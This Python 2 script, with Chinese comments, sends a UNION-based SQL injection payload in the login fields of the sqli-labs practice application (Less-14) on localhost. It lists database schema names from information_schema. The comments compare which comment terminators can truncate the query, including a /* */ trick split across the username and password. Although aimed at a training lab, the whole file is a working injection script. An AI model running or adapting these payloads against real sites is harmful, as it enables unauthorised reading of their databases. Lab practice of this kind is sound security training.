# -*- coding: utf-8 -*-
import urllib2
import urllib
from urllib import quote
#脚本应用于get请求单框注入情况下
#定义一个url
import time


url='http://localhost/sqli-labs/Less-14/' #lesson 11

payload_table_from_tab="-1') union select group_concat(schema_name),2 from information_schema.schemata " #从information_schema.tables中获取数据库所有表名lesson1
#payload_table_from_tab='-1")'+" union select 1,group_concat(schema_name),3 from information_schema.schemata " #从information_schema.tables中获取数据库所有表名_lesson4
#payload_end='-- ' #mysql终结符,很奇怪，为什么post中不能使用--+，是因为后面还有and 语句么，索性测试一下：
#'-- '  '#'  都可以
#'--+','--'  都不可以
#当然，如果-- 或 #都被过滤也可以使用多注入点特有的/* */来进行截断,比如:select * from administrators where username='admin'/* and password='*/'';
#最终经过考虑，以下截断格式在不判断SQL特殊字符的情况下比较全面可用，如果判断有某一字符就返回报错的话，那就去掉该字符即可
payload_end='-- #/*'
username=payload_table_from_tab+payload_end
password='*/-- #'
try:
    # 定义要提交的数据
    postdata = dict(uname=username, passwd=password)
    # url编码
    postdata = urllib.urlencode(postdata)
    # enable cookie
    req = urllib2.Request(url, postdata)
    res = urllib2.urlopen(req,data=None,timeout=2)
    text=res.read()
except Exception ,e:
    print "Error: "+e
print text
